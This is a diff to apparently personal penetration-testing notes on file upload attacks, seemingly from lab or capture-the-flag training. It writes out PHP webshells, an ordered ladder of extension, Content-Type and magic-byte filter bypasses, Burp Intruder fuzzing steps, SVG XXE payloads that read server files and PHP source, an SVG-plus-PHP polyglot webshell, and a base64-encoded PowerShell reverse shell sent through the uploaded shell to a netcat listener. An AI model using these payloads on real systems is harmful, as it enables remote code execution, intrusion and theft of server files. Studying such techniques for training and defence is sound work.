@@ -4,21 +4,65 @@ Part of [[COMMAND APPENDIX]]. Getting an executable file past an upload filter, 
 
 ---
 
+## Webshell Creation
+
+```bash
+# Static command (for hostname/id checks)
+cat << EOF > RCE.php
+<?php system('hostname'); ?>
+EOF
+
+# Parameterised webshell ($REQUEST = GET + POST + cookie, more flexible than $GET alone)
+cat << 'EOF' > RCE.php
+<?php system($_REQUEST['cmd']); ?>
+EOF
+
+# Execute commands once uploaded
+curl -s "http://<target>/uploads/RCE.php?cmd=cat+/flag.txt"
+```
+
 ## Filter Bypass Techniques
 
+**Extension bypass ladder (try in order):**
 ```
-Case-swap the extension:        .php   ->  .pHP
-Alternate/legacy extensions:    .phps, .php7
+1. Direct .php upload          → if no filter at all
+2. Case-swap: .pHP, .PHP       → if blacklist only checks lowercase literal
+3. Legacy extensions: .phar, .phps, .pht, .phtm, .phtml, .pgif, .php7
+4. Double extension: shell.php.jpg     → .jpg satisfies whitelist; misconfigured Apache executes .php anywhere in name
+5. Reverse double extension: shell.phar.jpg  → .phar passes blacklist, .jpg ends the name for whitelist
+6. Content-Type bypass: change header to image/gif or image/svg+xml in Burp
+7. MIME type (magic bytes): prepend GIF8 to file content — mime_content_type() returns image/gif
 ```
-*Blacklist filters commonly compare the extension as a literal lowercase string, `.php` matches, `.pHP` may not, even though the web server still hands it to the PHP interpreter regardless of case. If case-swapping doesn't work, try an upload-as-innocuous-type-then-rename trick: upload as `.txt` first, then use the app's own rename feature (if it has one) to restore the executable extension after the upload filter has already been satisfied.*
+
+**`.phar` is the highest-value alternative extension**, it's a legitimate PHP Archive format the PHP interpreter executes, and blacklists that block `.php`/`.phps`/`.phtml` routinely miss it.
+
+**Extension fuzzing via Burp Intruder** (when you need to enumerate the whole blacklist):
+```
+1. Capture upload request → send to Intruder (Ctrl+I)
+2. Clear payload positions, set: filename="RCE§.php§" (markers around the extension)
+3. Payload: paste PHP extensions list (see below), disable URL encoding
+4. Start attack → sort by Length → different length = "File successfully uploaded" hit
+```
+
+**PHP extensions list for Intruder:**
+```
+.php .php2 .php3 .php4 .php5 .php6 .php7 .phps .pht .phtm .phtml .pgif .shtml .phar .inc .hphp .ctp .module
+```
+Full list also at `/usr/share/SecLists/Discovery/Web-Content/web-extensions.txt`.
+
+**Case-swap:**
+```
+.pHP  .PHP  .Php
+```
 
 **Confirm code execution once a webshell lands:**
 ```bash
-curl "http://<target>/uploads/<shell>.pHP?cmd=whoami"
+curl "http://<target>/uploads/<shell>.phar?cmd=whoami"
+# Uploaded files commonly land in /uploads/, /profile_images/, /user_feedback_submissions/, etc.
+# Check the app's upload confirmation text for the exact path
 ```
-*Uploaded files commonly land in a predictable `uploads/`-style directory, check the app's own upload confirmation response for the exact path if it's not obvious.*
 
-**Escalating to a Windows reverse shell through the uploaded webshell** (base64-encoded, since special characters in a PowerShell one-liner make raw delivery through a URL parameter unreliable):
+**Windows reverse shell escalation via webshell** (base64 Unicode encoding for `-enc` flag):
 ```powershell
 $Text = '<powershell reverse shell script>'
 $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
@@ -28,13 +72,97 @@ $EncodedText = [Convert]::ToBase64String($Bytes)
 nc -nvlp 4444
 curl "http://<target>/uploads/<shell>.pHP?cmd=powershell%20-enc%20<encoded_string_here>"
 ```
-*Note the **Unicode** (UTF-16LE) encoding step before base64, that's specifically what `powershell -enc` expects, plain ASCII-then-base64 won't work.*
+*`powershell -enc` expects UTF-16LE base64, not plain ASCII-then-base64.*
 
-**Sanity check after landing code execution:** always run `whoami`/`id` immediately, training VMs frequently run the web server process as `root`/`nt authority\system` already, no privilege escalation needed at all before grabbing the flag.
+## Client-Side Bypass
 
-See [[Common Web Application Attacks#9.3.1. Using Executable Files|9.3.1]] (case-swap + PowerShell reverse shell, and the TinyFileManager case study where no filter existed at all).
+**Method 1 — Burp intercept:**
+1. Upload a real image, intercept the request in Burp
+2. Change `filename="image.jpg"` → `filename="shell.php"`
+3. Replace image bytes with `<?php system($_REQUEST['cmd']); ?>`
+4. Forward request
 
-#### Tags: #FileUpload #ExtensionFilterBypass #CaseSwapBypass #PowerShellReverseShell #Base64Unicode
+**Method 2 — Browser DevTools:**
+1. `Ctrl+Shift+C` → click the upload button/image area
+2. In the `<form>` tag: change `onSubmit="return checkFile()"` → `onSubmit="upload()"`
+3. In the `<input>` tag: remove `accept=".jpg,.jpeg,.png"` attribute
+4. Upload a `.php` file normally, browser no longer restricts it
+
+## Content-Type + MIME Bypass
+
+```
+# In Burp Repeater/Intercept:
+# 1. Content-Type header: change to image/gif, image/jpeg, or image/svg+xml
+# 2. File content: prepend GIF8 magic bytes (4 bytes, satisfies mime_content_type())
+```
+
+```
+Content-Type: image/gif
+
+GIF8
+<?php system($_REQUEST['cmd']); ?>
+```
+
+**Content-Type fuzzing for allowed types:**
+```bash
+wget https://github.com/danielmiessler/SecLists/raw/master/Discovery/Web-Content/web-all-content-types.txt
+cat web-all-content-types.txt | grep 'image/' | xclip -se c   # paste into Intruder Payload Options
+```
+Set the Intruder position around `image/jpeg` in the Content-Type header. Responses that say "File successfully uploaded" (not "Only images are allowed") are accepted types.
+
+## SVG XXE — File Read and PHP Source Disclosure
+
+When the app only accepts SVG images, inject XXE to read server files:
+
+**Arbitrary file read:**
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "/flag.txt"> ]>
+<svg>&xxe;</svg>
+```
+
+**PHP source code read (php://filter via XXE):**
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]>
+<svg>&xxe;</svg>
+```
+
+```bash
+# Save and upload:
+cat << 'EOF' > shell.svg
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]>
+<svg>&xxe;</svg>
+EOF
+
+# If the upload form doesn't accept .svg from the frontend:
+mv shell.svg shell.jpeg
+# Intercept in Burp → change filename="shell.svg" and Content-Type: image/svg+xml → forward
+```
+
+After upload, **view page source**, the file content appears inside the `<svg>` element. Decode base64:
+```bash
+echo 'BASE64BLOB' | base64 -d
+```
+
+**SVG+PHP polyglot** (SVG XML wrapper + PHP webshell in same file, used when SVG is allowed AND you need code execution):
+```xml
+<?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]> <svg>&xxe;</svg> <?php system($_REQUEST['cmd']); ?>
+```
+The PHP interpreter ignores the XML before `<?php` and executes the webshell. Save as `.phar.svg` (or `.phar.jpeg` for frontend bypass → intercept to fix extension).
+
+## Upload Date-Prefixed Filename Prediction
+
+When `upload.php` source reveals `$fileName = date('ymd') . '_' . basename(...)`:
+```bash
+date +%y%m%d   # today's date prefix, e.g. 231130
+# Full upload path: /contact/user_feedback_submissions/231130_shell.phar.svg
+```
+
+See [[Common Web Application Attacks#9.3.1. Using Executable Files|9.3.1]], [[File Upload Attacks (HTB Supplementary)]] (all new techniques above), [[Beep|Beep box writeup]] (null-byte trick on upload).
+
+#### Tags: #FileUpload #ExtensionFilterBypass #CaseSwapBypass #Phar #DoubleExtension #ContentTypeBypass #MIMEBypass #GIFMagicBytes #SVG #XXE #BurpIntruder #ClientSideBypass #PowerShellReverseShell
 
 ---
 
